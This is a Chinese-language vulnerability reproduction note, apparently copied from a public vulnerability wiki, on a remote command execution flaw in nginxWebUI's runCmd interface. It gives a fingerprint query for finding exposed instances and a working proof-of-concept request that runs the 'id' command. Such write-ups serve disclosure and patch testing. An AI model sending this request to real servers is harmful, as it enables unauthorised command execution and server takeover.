---
title: "nginxWebUI runCmd 远程命令执行漏洞"
date: 2026-10-16 09:10:01
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "nginxWebUI-runCmd"
tags:
  - "nginxWebUI-runCmd"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

nginxWebUI runCmd 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取到服务器权限，执行任意命令

## 漏洞影响

nginxWebUI

## 网络测绘

```
title="nginxwebui"
```

## 漏洞复现

登录页面

![image-20230704113502611](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230704113502611.png)

验证请求包

```
/AdminPage/conf/runCmd?cmd=id
```

![image-20230704113520591](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230704113520591.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/nginxWebUI-runCmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
